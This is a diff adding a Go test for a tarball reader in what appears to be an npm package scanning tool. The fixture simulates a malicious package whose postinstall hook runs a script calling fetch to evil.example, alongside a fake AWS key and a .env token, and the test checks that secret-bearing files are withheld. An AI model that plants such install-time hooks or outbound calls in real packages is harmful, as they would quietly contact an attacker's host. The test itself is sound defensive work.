@@ -9,6 +9,7 @@ import (
 	"strings"
 	"testing"
 	"time"
+	"unicode/utf8"
 )
 
 // tgz 按固定顺序写入：package/ 下的文件在前（第一个条目决定包根目录），其余按名字排序。
@@ -244,5 +245,54 @@ func TestParseUserAgent(t *testing.T) {
 		if got := ParseUserAgent(ua); got != want {
 			t.Errorf("ParseUserAgent(%q) = %+v，期望 %+v", ua, got, want)
 		}
+	}
+}
+
+func TestReadTarball(t *testing.T) {
+	b := tgz(t, map[string]string{
+		"package/package.json": `{"name":"@acme/x","version":"1.0.0","scripts":{"postinstall":"node a.js"}}`,
+		"package/a.js":         "fetch('https://evil.example/x')\n",
+		"package/dist/key.js":  "const k = 'AKIAABCDEFGHIJKLMNOP';\nfetch('https://evil.example/y')\n",
+		"package/.env":         "TOKEN=abc\n",
+		"package/logo.png":     "\x89PNG\x00AKIA",
+		"other/package.json":   `{"name":"ignored"}`,
+	})
+	scanned := map[string]bool{}
+	c, err := ReadTarball(bytes.NewReader(b), "a.js", 1000, func(file string, _ []byte) { scanned[file] = true })
+	if err != nil {
+		t.Fatal(err)
+	}
+	if c.Total != 5 || len(c.Files) != 5 {
+		t.Fatalf("应只统计包根目录下的 5 个文件：%+v", c.Files)
+	}
+	if c.File == nil || !strings.Contains(c.File.Text, "fetch") || c.File.Withheld != "" {
+		t.Fatalf("应读出 a.js：%+v", c.File)
+	}
+	if !scanned["a.js"] || !scanned["package.json"] {
+		t.Fatalf("普通文本文件都该扫描：%v", scanned)
+	}
+	if scanned[".env"] || scanned["dist/key.js"] || scanned["logo.png"] {
+		t.Fatalf("密钥文件、含密钥的源码、二进制不该交给扫描：%v", scanned)
+	}
+	for _, file := range []string{".env", "dist/key.js", "logo.png", "missing.js"} {
+		c, err := ReadTarball(bytes.NewReader(b), file, 1000, nil)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if c.File == nil || c.File.Text != "" || c.File.Withheld == "" {
+			t.Fatalf("%s 不该给内容：%+v", file, c.File)
+		}
+	}
+	// 超长文件按字节截断且仍是合法 UTF-8
+	long := tgz(t, map[string]string{"package/package.json": `{"name":"a","version":"1.0.0"}`, "package/big.txt": strings.Repeat("好", 1000)})
+	c, err = ReadTarball(bytes.NewReader(long), "big.txt", 100, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !c.File.Truncated || len(c.File.Text) > 100 || !utf8.ValidString(c.File.Text) {
+		t.Fatalf("截断：%+v", c.File)
+	}
+	if _, err := ReadTarball(bytes.NewReader(tgz(t, map[string]string{"package/a.js": "x"})), "", 10, nil); err != ErrNoPackageJSON {
+		t.Fatalf("没有 package.json 应报错：%v", err)
 	}
 }
